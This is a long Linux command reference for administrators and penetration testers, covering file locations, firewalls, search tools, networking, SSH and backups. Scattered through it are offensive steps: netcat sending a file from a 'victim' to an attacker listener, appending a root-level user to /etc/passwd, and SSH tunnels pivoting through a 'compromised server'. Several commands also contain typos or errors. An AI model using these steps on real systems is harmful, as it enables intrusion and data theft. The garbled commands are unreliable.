---
description: >-
  The below Linux OS notes can be used as a guide for both IT System
  administrators and cyber security specialists (offensive and defensive).
---

# Linux

### Description of Common Directories in Linux

#### **Root Directory**&#x20;

`/`&#x20;

#### **Hashes of users and passwords**&#x20;

`/etc/shadow`&#x20;

#### **Binaries**&#x20;

`/bin`

#### **Local Users**&#x20;

`/etc/passwd`&#x20;

#### **Boot Files (Kernel)**&#x20;

`/boot`&#x20;

#### **Local Groups**&#x20;

`/etc/group`&#x20;

#### **System Devices**&#x20;

`/dev`

#### **Mounting Partition**&#x20;

`/etc/fstab`&#x20;

#### **Config Files**&#x20;

`/etc`&#x20;

#### **Runcom startup**&#x20;

`/etc/rc.d`&#x20;

#### **User Directory**

`/home`

#### **Service scripts**&#x20;

`/etc/init.d`&#x20;

#### **Software Libraries**&#x20;

`/lib`

#### **Local DNS**&#x20;

`/etc/hosts`&#x20;

#### **Mount Points**&#x20;

`/media`

#### **Hostname for localhost**&#x20;

`/etc/HOSTNAME`&#x20;

#### **Temporary Mount Point**&#x20;

`/mnt`

#### **Network Config File**&#x20;

`/etc/network/interfaces`&#x20;

#### **3rd Party Software**&#x20;

`/opt`

#### **System Environment Variables**&#x20;

`/etc/profile`

#### **Processes**&#x20;

`/proc`&#x20;

#### **Package sources for APT-GET**&#x20;

`/etc/apt/sources.list`&#x20;

#### **DNS Servers**

&#x20;`/etc/resolv.conf`&#x20;

#### **Run time variables**

`/run`

#### **User Bash History**&#x20;

`~/.bash_history`&#x20;

#### **Admin Binaries**

`/sbin`&#x20;

#### **SSH Authorized Keys**&#x20;

`~/.ssh`&#x20;

#### **Temporary Files**&#x20;

`/tmp`&#x20;

#### **System Log Files**&#x20;

`/var/log`&#x20;

#### **User Binaries, Libraries**&#x20;

`/usr`&#x20;

#### **System Log Files**&#x20;

`/var/adm`&#x20;

#### **Variable System Files**&#x20;

`/var`&#x20;

#### **Apache Connection Log**&#x20;

`/var/log/apache/access.log`

### System and Server Configurations

#### Config Files Locations

Usually configuration files are either in your `/etc/` directory, or in `/usr/local/servicename/conf`

#### **Apache Configs**

`/etc/apache2/apache.conf` `/etc/php/php.ini`

#### **Exim Configs**

`/etc/exim.conf`

#### **MySQL Configs**

`/etc/my.cnf` `~/.my.cnf` **Only in some distros** `/var/lib/mysql` **Contains databases and tables**

#### **httpd**

`/etc/httpd/conf`

#### Sys Info

**Drivers Installed**

```
cat /proc/modules
```

**System Type and Version**

```
cat /proc/version
uname -a
```

**Processor Info**

```
cat /proc/cpuinfo
```

**RAM Usage**

```
free -m
```

**Disk Usage**

```
df -h
```

**File and Directory Sizes**

Use grep for certain inquiries about a specific file/directory size.

```
du -h
```

Example is finding out what takes the most space on your disk

```
du -s -k -c * | sort -rn | more
```

**Mounted file systems**

```
cat /proc/mounts
```

### Security and Hardening

#### Firewalls

**IPtables**

**Basics**

The default behaviour of iptables firewall rules is to accept traffic on all three below chains. By defaulting to the accept rule, you can then use iptables to deny specific IP addresses or port numbers, while continuing to accept all other connections. `Chains`

* **Input**: This chain applies to the packets incoming to the firewall.
* **Output**: This chain applies to the packets outgoing from the firewall.
* **Forward** This chain applies to the packets routed through the system. `Responses` **Accept** – Allow the connection. **Drop** – Drop the connection, act like it never happened. This is best if you don’t want the source to realize your system exists. **Reject** – Don’t allow the connection, but send back an error. This is best if you don’t want a particular source to connect to your system, but you want them to know that your firewall blocked them.

**Basic Rules Commands**

**Exporting existing rules**

```
[1]
iptables-save > firewall-rules.out

[2]
iptables-save -c outputfile
```

**Apply a rules file to iptables / Restore IPtables from a file**

```
[1]
iptables-restore < firewall-rules.out

[2]
iptables-restore inputfile
```

**Listing current rules**

```
# iptables -L -v --line-numbers
```

**Flush all rules**

```
# iptables -F
```

**Delete a rule by line number** The below deletes input rule number 2

```
iptables -D INPUT 2
```

**Saving rules**

```
Ubuntu:
# /etc/init.d/iptables save
# /sbin/service iptables save
RedHat / CentOS:
# /etc/init.d/iptables save
# /sbin/iptables-save
```

**Start and stop the service**

```
# service iptables start
# service iptables stop
```

**Rules Examples**

**Example commands to drop an inbound connection using IP, subnet IP/CIDR and protocol/port**

```
# iptables -A INPUT -s ip -j DROP
# iptables -A INPUT -s ip/cidr -j DROP
# iptables -A INPUT -p tcp --dport
ip -j DROP
```

**Block all inbound connections**

```
# iptables-policy INPUT DROP
```

**Block all outbound connections**

```
# iptables-policy OUTPUT DROP
```

**Log all denied connections**

```
# iptables -I INPUT 5 -m limit --limit 5/min -j LOG
--log-prefix "iptables denied: " --log-level 7
```

**Allow SSH Outbound**

```
iptables -A OUTPUT -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT

iptables -A INPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT
```

**Allow ICMP Outbound**

```
iptables -A OUTPUT -p icmp --icmp-type echo-request -j ACCEPT

iptables -A INPUT -p icmp --icmp-type echo-reply -j ACCEPT
```

**Configuring iptables to accept all traffic on all chains** The below commands represent the pre-configured behaviour of iptables so YOU DON'T NEED TO RUN THEM but in the situation if you want to view/change the rules that represent the default behaviour.

```
iptables --policy INPUT ACCEPT
iptables --policy OUTPUT ACCEPT 
iptables --policy FORWARD ACCEPT
```

**Configuring iptables to deny all traffic on all chains** By specifying below rules, we drop all traffic and use rules to specify which ip/port should pass. This is useful for servers running static ips and/or contain sensitive information.

```
iptables --policy INPUT DROP
iptables --policy OUTPUT DROP
iptables --policy FORWARD DROP
```

**Allowing SSH Server to send and receive packets** **Accepts incoming traffic**

```
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
```

* `-A INPUT` appends to the INPUT chain, i.e., packets destined for the system.
* `-p tcp --dport 22` applies to TCP protocol with destination port 22.
* `-j ACCEPT` specifies (jump to) target rule ACCEPT. **Allows outgoing traffic from port 22**

```
iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT
```

* `-A OUTPUT` append to the OUTPUT chain, i.e., packets leaving the system.
* `-p tcp --sport 22` applies to TCP protocol with source port 22. **Note** You don't need to configure two rules to allow connections in and from the host on a specific port. Connection states give you the capability you’d need to allow two way communication but only allow one way connections to be established. The system is permitted to send back information over SSH as long as the session has already been established, which makes SSH communication possible between these two hosts. The below command is an example

```
iptables -A INPUT -p tcp --dport ssh -s 10.10.10.10 -m state --state NEW,ESTABLISHED -j ACCEPT
```

**Blocking a specific IP/group of IPs for incoming connections**

```
iptables -A INPUT -s 10.10.10.10 -j DROP
iptables -A INPUT -s 10.10.10.0/24 -j DROP
```

**Blocking a specific IP/group of IPs for incoming connections on port 22 / SSH**

```
iptables -A INPUT -p tcp --dport ssh -s 10.10.10.10 -j DROP
```

**ufw firewall**

Start and stop the firewall

```
# ufw enable
# ufw disable
```

Start and stop the logging

```
# ufw logging on
# ufw logging off
```

Backup all rules / export rules

```
# cp /lib/ufw/{user.rules,user6.rules} / backup-location
```

Delete a rule

```
# ufw delete <RULE-#>
```

Deny inbound UDP connections to port 443 from a specific IP

```
ufw deny from ip proto udp to any
port 443
```

Allow SSH traffic all directions

```
# ufw allow all ssh
```

### File Processing

#### less command

Used to show first few lines of a file with the ability to keep viewing using the \[space] button. Searching inside the file with less can be done by typing \[/] followed by the \[keyword] then \[ENTER].

#### Opening a dashed file

Sometimes you may see a file that starts with \[-] in its name. In order to open these files you have to specify its full path. Say the file name is \[-file] then we display its content in the following manner

```
cat ./-file
```

As you can see, we added \[./] before the file. If the file was located somewhere then we type its full path

```
cat /home/motasem/-file
```

Another way is to use the \[<] operator

```
cat <-file
```

#### Sorting and removing duplicates

Say we have a file full of content in string format. if we want to sort the content alphabetically and remove duplicates we would throw the below command

```
sort [file.txt] | uniq -u
```

#### Grep

grep is a useful tool for content extraction and supports regular expression.

**Scenarios**

**searching for a specific string**

A simple example would be grepping a text string \[hello] from a file

```
cat file.txt | grep hello
```

**Searching for a string case-sensitive**

```
cat file.txt | grep -i 'hello'
```

**searching to match only spefici string**

This will search and display lines containing the word \[hello] as a whole and won't display lines where \[hello] is part of a phrase such as \[hello world]

```
cat file.txt | grep -w 'hello'
```

**searching for lines that don't contain a given word**

This will match all lines that don't contain the word \[hello]

```
grep -v 'hello' file.txt
```

**saving the output to a text file**

```
grep 'hello' file.txt > matches.txt
```

**Searching recursively**

Recusrively means searching in all directories and sub-directories for the word \[hello]

```
grep -R 'hello' [directory]
```

**counting the number of times a word is mentioned**

\[-n] will precede each line with its number in the file. \[-c] is used to display the number of times \[hello] is mentioed in the file.

```
grep -n -c 'hello' file.txt
```

**grepping all lines that start with a specific pattern**

In the below example, we display all lines that start with the letter \[h]

```
cat file.txt | grep '^h'
```

#### The find command

**Search by Name**

**find the file.txt in the current directory**

```
find . -name "file.txt"
```

**Search all directories and find directory named \[config]**

```
find / -type d -name "config"
```

**Search by permissions**

When searching for permissions, we specify the permissions either in octal form \[777] or in symbol form \[u=w]. Also we use \[/] and \[-] to make the search more inclusive. The \[-] is used to find files or directories with at least the specified permissions. The \[/] will match files/directories with any of the permissions set

**search in all directories for files have '777' permissions**

```
find / -type f -perm 0777
```

**find executable files**

```
find / -perm a=x
```

**Search by user**

**find all files under admin in home directory**

```
find /home -user admin
```

**Search by last modified/accessed time**

The \[min] refers to minutes The \[time] refers to days

**find files modified in the last 10 days**

```
find / -mtime -10

The [m] is for modified.
```

**find files accessed in the last 10 days**

```
find / -atime -10

The [a] is for accessed.
```

**find files accessed in the last 30 minutes**

```
find / -mtime -30
```

**find files accessed more than 30 minutes ago**

```
find / -mtime +30
```

**find files modified in the last 24 hours**

```
find / -mtime 0
```

**search for a file modified with exact or after time given in yyyy-mm-dd**

```
find / -type f -newermt 2021–09–11 ! -newermt 2021–09–13**
```

**Handling input and output**

**Saving the search to an output file**

```
find / -type f -mtime 0 > results.txt
```

**Supperssing errors**

```
find / -type f -mtime 0 2> /dev/null
```

**Search by size**

Generally, when searching by size we specify the number and the unit. For example for bytes we use \[c], for kilobytes we use \[k] and for \[M] for Megabytes. Additionally, sometimes we want to find files with size less/more than a specific number hence we use \[+] or \[-] before the number or the size.

**find files with 50MB size**

```
find / -size 50M
```

**find files less than 50MB size**

```
find / -size -50M
```

**Search by file type**

**find executable files**

```
find / -type f -executable
```

**Search for base64 content in php files**

```
find . -type f -name "*.php" -exec grep -Ei "[a-z0-9/=]{50,}" {} /dev/null \;
```

#### File Transfer with SSH

**Refer to the SSH operations section in this document**

#### File Transfer with Netcat

Netcat can be used to send and receive files in the same fashion of upload and download. First, the sender needs to issue the below command

```
nc [destination-ip] [destination-port] < file.txt
```

Second, the receiver will need to issue the below command to recieve the file

```
nc -lvp [destination-port] > file.txt
```

#### Working with Tar Command

**Compressing a directory**

```
root@Red-hat:~$:tar -zcvf archive-name.tar.gz directory-name
root@Red-hat:~$:gzip dirctory
```

**Compressing files**

```
root@Red-hat:~$:tar -cvf archive-name.tar.gz file-paths-space-separated
root@Red-hat:~$:gzip file-paths-space-separated
```

**Appending files to a tarball**

```
root@Red-hat:~$:tar -rvf archive-name.tar.gz file-path
```

**Listing files included in the tarball**

```
root@Red-hat:~$:tar -tvf archive-name.tar.gz 
```

**Extracting Files**

```
root@Red-hat:~$:tar -zxvf prog-1-jan-2005.tar.gz
root@Red-hat:~$:gunzip directory
```

**Extracting single file**

```
root@Red-hat:~$:tar -zxf prog-1-jan-2005.tar.gz etc/filename
```

#### Zipping a file

```
root@Red-hat:~$:sudo zip plugin-shell.zip plugin-shell.php
```

#### Creating hex dump of any file

```
root@Red-hat:~$:xxd -p file.exe | tr -d '\n' 
file.exe.hex
```

#### Compiling a shared object for MYSQL server with gcc: from C/C++ file to shared object.

```
root@Red-hat:~$: gcc -Wall -I/usr/include/mysql -I. -shared filename.c -o $(LIBDIR)/filename.so
```

#### Compiling a shared object for MariaDB server with gcc: from C/C++ file to shared object.

```
root@Red-hat:~$:gcc -Wall -I/usr/include/mysql -I. -shared filename.c -o $(LIBDIR)/filename.so
```

#### Replacing words in a file

```
root@Red-hat:~$: sed 's/Blackhat/Defcon/' myfile
```

#### Cross Compile a file on Linux

```
root@kali:~$i686-w64-mingw32-gcc adduser.c -o adduser.exe
```

#### Convert base64 zip file into its original form

```
root@kali:~$cat data.txt | base64 -d > documents.zip*
```

#### File Transfer with Netcat

On kali, setup a listner

```
root@kali:nc -lvp 444 > [filename.txt]
```

on the victim ssh

```
root@kali:nc -w 3 [kali ip] [port] < [filename.txt]
```

#### Counting words,lines and characters

```
root@Red-hat:~$: wc /etc/password
85 294 2078 /etc/passwd
```

#### Sharing files with other machines

**smbserver.py**

creating directory and copying a test file to it.

```
root@kali# mkdir smb
root@kali# cp /home/user/desktop/file.txt smb/
```

Starting the smb server specifying the share name and directory where files are hosted

```
smbserver.py share smb
```

Retriving files from this share can be done on other machines with below command

```
\\serverip\share\file.txt
```

#### Deleting files with specific extension

The example below applies to files with `.bak` extension.

```
find . -name "*.bak" -type f -delete
```

### Processes, services and Network Management

#### Display running services

```
service --status-all
```

#### Starting and stopping common services

```
# /etc/init,d/apache2 start
# /etc/init.d/apache2 restart
# /etc/init.d/apache2 stop (stops only until reboot)
# service mysql start
# service mysql restart
# service mysql stop (stops only until reboot)
```

#### Checking Services Status

```
services --status-all
```

#### Adding/Removing Service From Startup

**Adding**

```
update-rc.d service defaults
```

**Removing**

```
update-rc.d service remove
```

#### Displaying running processes

We can use `ps` to dive into processes. The below are the options for this command |`-e`|all processes |`-f`|full-format listing |`-j`|jobs format |`-l`|long format |`-u`|user-oriented format For example, the below command lists processes with details about the user using the process.

```
ps aux
```

`a` and `x` are necessary when using BSD syntax as they lift the “only yourself” and “must have a tty” restrictions; in other words, it becomes possible to display all processes. And for process tree

```
ps axjf
```

#### Killing a process

```
sudo kill -9 PID
-9: forefully
```

Also its good to know the below commands

* SIGTERM - Kill the process, but allow it to do some cleanup tasks beforehand
* SIGKILL - Kill the process - doesn't do any cleanup after the fact
* SIGSTOP - Stop/suspend a process

#### Finding a PID of a process

This relies on knowing the program name

```
ps faux|awk '/prog[r]amname/ {print "PID: "$2}'
```

#### Finding the opened files of a process

First you need to obtain the process PID then,

```
cd /dev/pid
cd fd
```

Opened files can be found in **fd** directory and other resources can be found under **maps**

```
cat /proc/pid/maps
```

#### Finding the process PID listening on specific port

```
sudo lsof -t -i:8000
```

#### Auditing Network Connections

**With ss**

```
root@Red-hat:~$:sudo ss -antlp
```

**With Netstat** We can use netstat to obtain full details about network connections. Below is an explanation of all command options |`-a`|show both listening and non-listening sockets |`-l`|show only listening sockets |`-n`|show numeric output instead of resolving the IP address and port number |`-t`|TCP |`-u`|UDP |`-x`|UNIX |`-p`|Show the PID and name of the program to which the socket belongs. For example, The command below lists all most interesting network data in a nice output

```
netstat -tulpn
```

This one below lists network connections with the processes using them.

```
netstat -at | less
```

**With lsof**

```
lsof -i
```

Another way to filter connections is by using ports. For example the below command filter only connections on port 25

```
lsof -i :25
```

#### Displaying the default routing table

Some aspects of the routing table to note: •Routes are processed in order – default route last •Mask 0.0.0.0 routes everything, but it is the last to be checked •Almost all hosts have at least one route •Usually just a default route

```
root@Red-hat:~$:netstat -rn
```

#### Adding a static route in Linux

```
root@Red-hat:~$: nano /etc/network/interface
```

and add below as an example

```
up route add –net 10.0.13.0/24 gw 10.0.12.137
```

This will apply a static route and route all 10.0.13.0 traffic the router sees to 10.0.12.137

#### Adding a DNS server manually to a machine

```
root@Red-hat:~$: nano /etc/resolv.conf
```

and you can add an example below

```
nameserver 10.0.0.1
```

Flushing DNS

```
# /etc/init.d/dns-clean start
```

#### Manually assigning an IP address and default route to a machine

```
root@Red-hat:~$:  ifconfig eth0 10.0.0.2 netmask 255.255.255.0 up

root@Red-hat:~$:  route add default gw 10.0.0.1
```

#### Adding entry to the host file

```
root@Red-hat:~$:sudo bash -c " echo ‘10.11.1.250 sandbox.local’ >> /etc/hosts".
```

#### Adding a static IP address permanently

```
root@Red-hat:~$:nano /etc/network/interfaces
```

Paste the following

```
auto eth0
iface eth0 inet static ❶ # can be static or dhcp
address 192.168.20.9
netmask 255.255.255.0 ❷
gateway 192.168.20.1 ❸
```

#### Assigning a dynamic IP via DHCP

In /etc/network/interfaces, add the following:

```
root@Red-hat:~$: iface eth0 inet dhcp
```

#### Restarting all network interfaces

```
root@Red-hat:~$: /etc/init.d/networking restart
```

#### Configure network services to use proxy

In /etc/bash/bashrc, enter the following to the bottom of the file

```
export ftp_proxy="ftp://username:password@proxyIP:port"
export http_proxy="http://username:password@proxyIP:port"
export https_proxy="https://username:password@proxyIP:port"
export socks_proxy="https://username:password@proxyIP:port"
```

#### Changing smb password

```
root@Red-hat:~$:root@kali:mbpasswd -r domain.com -U tlavel
```

Old SMB password: New SMB password: Retype new SMB password: Password changed for user tlavel on domain.com.

#### Logging in to a RDP-enabled windows server given the credentials

```
root@kali:~$xfreerdp /d:[domain-controller-name] /u:[username] /v:10.5.5.20 +clipboard
```

#### Logging in via RDP with out supplementing domain name

```
root@kali:~$:xfreerdp /u:[username] /v:10.5.5.20 +clipboard
```

#### Managing Services

Services can be started, stopped and enabled to run during the boot using the `systemctl` command. We can do four options with `systemctl`:

* Start
* Stop
* Enable
* Disable systemctl is an easy to use command that takes the following formatting: `systemctl [option] [service]` #example

```
systemctl enable apache2
```

The above command will enable apache2 service to run on the boot-up of the system.

#### Creating SMB Share

```
useradd -m <NEW USER>

passwd <NEW USER>

smbpasswd -a <NEW USER>

echo [Share] >> /etc/samba/smb.conf

# echo /<PATH OF FOLDER TO SHARE> >>
/etc/samba/smb.conf

echo available = yes >> /etc/samba/smb.conf

echo valid users = <NEW USER> >>
/etc/samba/smb.conf

echo read only = no >> /etc/samba/smb.conf

echo browsable = yes >> /etc/samba/smb.conf

echo public = yes >> /etc/samba/smb.conf

# echo writable = yes >> /etc/samba/smb.conf

service smbd restart
```

Mount and SMB share to remote system

```
mount -t smbfs -o username=<USER NAME> //<SERVER NAME OR IP ADDRESS>/<SHARE NAME> /mnt/<MOUNT POINT>/
```

#### Change MAC address

```
macchanger -m <mac> int
```

### Package Management

#### Installing kept-packages

```
root@Red-hat:~$:sudo apt-get --with-new-pkgs upgrade
```

or-be-cautious with this one below as it may remove some packages to install dependencies

```
root@Red-hat:~$:sudo apt-get dist-upgrade
```

#### Updating available packages

```
root@Red-hat:~$:Sudo apt update
```

#### Upgrading the core system and available packages to latest version

```
root@Red-hat:~$:Sudo apt upgrade 
```

#### Source based Installs

Some packages may not be found in the sources list of the distro so you might need to download the source files and install it your self.

They usually come in either a .tar.gz, .tgz, .tar.bz2, .tbz2, or a .tar.lzma

First step is decompressing the file **tgz** and **.tar.gz**

```
tar xvzf filename
```

**.tar.bz2**

```
tar xjvf filename
```

Next CD into the directory and

```
./configure
./configure --help
```

Next

```
make -j'grep -ic "core id" /proc/cpuinfo'
```

Next

```
make install
```

* Ubuntu

Fetch list of available updates

```
# apt-get update
```

Strictly upgrade the current packages

```
apt-get upgrade
```

Install updates (new ones)

```
apt-get dist-upgrade
```

* Red Hat Enterprise Linux 2.1,3,4

```
# up2date
```

To update non-interactively

```
up2date-nox --update
```

To install a specific package

```
# up2date <PACKAGE NAME>
```

To update a specific package

```
up2date -u <PACKAGE NAME>
```

* Red Hat Enterprise Linux 5:

```
pup
```

* Red Hat Enterprise Linux 6

```
yum update
```

To list a specific installed package

```
yum list installed <PACKAGE NAME>
```

To install a specific package

```
yum install <PACKAGE NAME>
```

To update a specific package

```
yum update <PACKAGE NAME>
```

### Directory operations

#### Creating a directory and multiple sub-directories at once

```
root@Red-hat:~$:mkdir -p test/{recon,exploit,report}
```

#### Returning the full path of a file or a directory

```
root@Red-hat:~$:which sbd
```

OR

```
root@Red-hat:~$:locate sbd.exe
```

### Web Operations

#### Installing Free SSL

```
root@Red-hat:~$:sudo add-apt-repository ppa:certbot/certbot
root@Red-hat:~$:sudo apt install python-certbot-apache
root@Red-hat:~$: sudo apt install -y certbot python3-certbot-apache
root@Red-hat:~$:sudo ufw status
root@Red-hat:~$:sudo ufw allow 'Apache Full'
root@Red-hat:~$:sudo ufw delete allow 'Apache'
root@Red-hat:~$:sudo ufw status
root@Red-hat:~$:sudo certbot --apache -d your_domain -d www.your_domain
root@Red-hat:~$:sudo certbot renew --dry-run
```

#### Starting python http server

```
root@Red-hat:~$:sudo python3 -m http.server 80
```

Similarly we can start a server using PHP.

```
php -S 127.0.0.1:8000
```

#### Tuning Apache2 for performance using mpm-prefork

Run Apache buddy first to get details about the server and recommendations for apache

```
root@Red-hat:~$:sudo curl -sL https://raw.githubusercontent.com/richardforth/apache2buddy/master/apache2buddy.pl | sudo perl
```

Then

```
root@Red-hat:~$:sudo nano /etc/apache2/mods-available/mpm-prefork.conf
```

\#Example config for good performance MaxRequestWorkers must be

```
>=StartServers*ThreadsPerChild
```

Refer to httpd.apache.org/docs/2.4/mod/worker.html

```
ServerLimit        512
StartServers         2
MaxRequestWorkers  150
MinSpareThreads     25
MaxSpareThreads    150
ThreadsPerChild     25
MaxConnectionsPerChild 0 [to keep child procces running and prevent termination]
```

#### Updating Apache

First we add the required repo

```
curl -sSL https://packages.sury.org/apache2/README.txt | sudo bash -x
```

Then issue the below commands

```
sudo apt update
sudo apt install apache2
```

#### Creating an HTTPS web server with python

First, we will need to create a self-signed certificate with the following command

```
openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
```

Once we have an SSL certificate, we can spawn a simple HTTPS server using python3 with the following command

```
python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
```

### Disk Management

#### Mounting a drive in linux

**List the disks and their drives**

```
root@Red-hat:~$:Fdisk -l
root@Red-hat:~$:mkdir /mnt/target1
root@Red-hat:~$:mount /de
```

#### Resize Disk

**Check Disk Size**

```
df -h
```

**Check Partition**

```
lsblk
```

**Grow Partition**

```
sudo growpart /dev/sda 1
Output
CHANGED: partition=1 start=4096 old: size=20967424 end=20971520 new: size=1048571871,end=1048575967
```

**Resize File System**

```
sudo resize2fs /dev/sda1
Output
resize2fs 1.43.4 (31-Jan-2017)
Filesystem at /dev/sda1 is mounted on /; on-line resizing required
old_desc_blocks = 2, new_desc_blocks = 63
The filesystem on /dev/sda1 is now 131071483 (4k) blocks long.
```

**Resize another way**

```
cfdisk /dev/sda/
resize2fs /dev/sda1
```

**Mount the resized partition**

```
sudo mount /dev/sda1 ~/mountpoint
```

### Users Operations

#### Adding a user

```
root@Red-hat:~$:adduser Motasem
```

#### Adding a user to the sudoers group

```
root@Red-hat:~$:adduser motasem sudo
```

#### Adding a user without shell or home directory

This is useful if you want to designate this user for specific tasks such as web server user

```
sudo /usr/sbin/useradd -M -r [user]
```

\[-r] creates a system user without login, password or home directory You can also use the options \[--shell=/bin/false] to disable shell for the user. \[--no-create-home] can also be used to disable home directory for the user.

#### Disable shell for existing user

```
usermod [user] -s /bin/false
OR
usermod [user] -s /sbin/nologin
```

#### Remove a user

```
sudo /usr/sbin/deluser [user]
```

#### Adding privileged user to /etc/passwd/

```
root@kali:~$perl -le 'print crypt("bulldog2", "aa")'
```

Now,adding the privileged user with the hash from the above command

```
root@kali:~$echo "motasem:aadiOpWrzh6/U:0:0:motasem:/root:/bin/bash" >> /etc/passwd
```

#### Changing password

```
$ passwd user-name
```

or

```
$ sudo su passwd
```

### Cron Jobs

#### Viewing cron jobs

```
root@Red-hat:~$:ls | grep cron
```

#### Viewing cron tab

```
root@Red-hat:~$:Nano /etc/crontab
```

#### Adding cronjob to restart apache and the OS every day at midnight:

```
0 0 * * * service apache2 restart
0 0 * * * /sbin/shutdown -r now
```

### Resource Management

#### Viewing real time consumption of resources in Linux

```
root@Red-hat:~$:top
root@Red-hat:~$:top -i 
```

### SSH operations

#### Logging in with private key

```
root@Red-hat:~$:chmod 600 key
root@Red-hat:~$:ssh -i key user@192.168.2.120
```

#### Logging in when .bashrc doesn't allow ssh

In some instances, the \[.bashrc] file doesn't allow logging in with SSH so in order to bypass this limitation we se the option \[-T]

```
ssh -T user@localhost
```

#### Preventing ssh from attempting to add the host key and to accept it

```
root@Red-hat:~$:ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" kali@10.11.0.4
```

It can be used when dealing with a non-interactive shells during a pentest.

#### Generating SSH public and private key

```
root@Red-hat:~$:mkdir keys
root@Red-hat:~$:ssh-keygen
```

Your identification has been saved in \[/tmp/keys/id\_rsa] Your public key has been saved in \[/tmp/keys/id\_rsa.pub] Authenticating a machine to SSH server with private key instead of password After generation the public key on the client machine, copy the content of id\_rsa.pub

```
root@Red-hat:~$:Cat id_rsa.pub
root@Red-hat:~$:Echo [content of id_rsa.pub] >>   /.ssh/authorized_keys 
```

Note: If the purpose of this authentication is for the client to do the port forwarding to your kali linux machine during a pentest then we need to add specific restrictions to make this connection only valid for port forwarding without the ability to execute any other commands Then the public key created at the client machine would look like this

```
command="echo 'This account can only be used for port forwarding'",
no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa ssh-rsa AAAAB3NzaC1yc2EAAAADAQABA
AABAQCxO27JE5uXiHqoUUb4j9o/IPHxsPg+fflPKW4N6pK0ZXSmMfLhjaHyhUr4auF+hSnF2g1hN4N2Z4DjkfZ
9f95O7Ox3m0oaUgEwHtZcwTNNLJiHs2fSs7ObLR+gZ23kaJ+TYM8ZIo/ENC68Py+NhtW1c2So95ARwCa/Hkb7k
Z1xNo6f6rvCqXAyk/WZcBXxYkGqOLut3c5B+++6h3spOPlDkoPs8T5/wJNcn8i12Lex/d02iOWCLGEav2V1R9x
k87xVdI6h5BPySl35+ZXOrHzazbddS7MwGFz16coo+wbHbTR6P5fF9Z1Zm9O/US2LoqHxs7OxNq61BLtr4I/MD
nin
```

#### Establishing ssh connection from client to server without executing any commands and sending the connection to the background.

This is useful when if you want to continue working on the host you just compromised and don’t want the SSH connection to execute any commands

```
root@Red-hat:~$:ssh -f -N kali@10.11.0.4
```

#### Copying or uploading a file from local system to another host

```
root@kali:scp test.txt host@172.20.10.8:/opt
```

If the SSH server was running on different port, you can specify it in the command

```
root@kali:scp -P port test.txt host@172.20.10.8:/opt
```

#### Copying or downloading a file from remote system to local host

```
root@kali:scp host@172.20.10.8:/root/Technical-Doc-RHS.odt /tmp
```

Use -r option when downloading or uploading directories recursively use -v for verbosity use -C to enable compression if ssh is running on different port, specify it with -P \[port-number] use -i \[private-key] if the authentication has been done with private key.

#### SSH Tunnels

An encrypted tunnel built using the SSH protocol constitutes an SSH tunnel. Unencrypted traffic can be transported over a network via an SSH tunnel through an encrypted channel.

SSH tunnels can be used to securely transfer files and also to offer a way around firewalls that block or filter specific internet services. For instance, a company might use its proxy filter to ban specific websites. However, users might not want the company proxy filter to track or obstruct their online activity. If users are able to establish a connection to an external SSH server, they can build an SSH tunnel to route a certain port on their local system to port 80 on a distant web server.

SSH tunnels can be created using port forwarding as explained below

**SSH Local port forwarding**

Syntax of local port forwarding

```
SSH -L local-port-to-listen:remote-host:remote-port
```

**Scenario 1**

The below scenario assumes that we have compromised an internal server and wants to establish connection to an internal machine that resides on a different subnet that can't be reached. This internal machine has port 445 open for SMB protocol and we want to interact with it from the attacking machine through the compromised server

This command is typed on the attacker machine

```
root@kali:~$sudo ssh -N -L 0.0.0.0:9001:192.168.1.110:445 compromised@10.11.0.128
```

`-L`: means local forwarding `10.11.0.128`: IP of the compromised server. `192.168.1.110`: IP of the internal machine running SMB shares

This command means that any connection regardless of the source address on port 9001 will be forwarded to 192.168.1.110 which is the IP of the internal target client and through an SSH tunnel established through the compromised internal server.

Next step is to connect to the target port, in our case its 9001, from your kali machine as a local connection.

```
root@kali:~$smbclient -L 127.0.0.1 -p 9001 -U Administrator
```

**SSH Remote Port Forwarding**

The exact opposite of SSH local port forwarding. SSH tunnel will get around the firewall.

**Scenario 1**

Configure a SSH tunnel directed to your kali machine to land on the internal client. The internal client runs mysql on port 3306 but resides on a different subnet than the compromised server. We want to access mysql on the internal client from our attacking machine through the compromised server.

You should have an SSH server running on your attacking machine as well so that the compromised server will connect to it and establish the tunnel.

On the compromised server type this command

```
root@kali:~$ssh -N -R 10.11.0.4:2221:client-ip:3306 kali@10.11.0.4
```

The above command will let the compromised server connect to your kali attacking machine and establish an SSH tunnel so that it will forward all requests to port 3306 mysql to your attacking machine on port 2221.

`10.11.0.4`: Attacking machine IP

On your kali machine and depending on the port that is open on the internal client machine, you can interact directly

```
root@kali:~$Nc 127.0.0.1 2221 will connect you to the mysql server on the internal client machine
```

**SSH Dynamic Port Forwarding**

Instead of establishing an SSH tunnel for every host or every port, we use SOCKS4 Proxy on the kali machine to establish dynamic port forwarding that will redirect all incoming traffic to the internal target network through the ssh tunnel established between kali and the compromised server

```
root@kali:~$sudo ssh -N -D 127.0.0.1:8080 server@10.11.0.128
```

On kali machine, editing the configuration file of proxy chains is a necessary requirements for all testing tools to work

```
root@kali:~$cat /etc/proxychains.conf
```

Add

```
socks4 127.0.0.1 8080
```

Then any subsequent command should be prepended with proxychains to work through this tunnel. Example nmap command

```
root@kali:~$sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110
```

### Backup and Recovery

#### Copy an entire disk to another

```
root@kali:~$dd if = /dev/sda of = /dev/sdb
```

if: source disk of: destination disk

#### backup a Partition

```
<root@kali:~$dd if=/dev/hda1 of=~/partition.img
```

You can specify your target path or image file

#### create an image of a Hard Disk

```
<root@kali:~$dd if = /dev/hda of = ~/hdadisk.img
```

You can create an image file of the hard disk and save it in other storage devices

#### restore using the Hard Disk Image

```
<root@kali:~$dd if = hdadisk.img of = /dev/hdb
```

#### File Recovery Using Test Disk

**Install the utility**

```
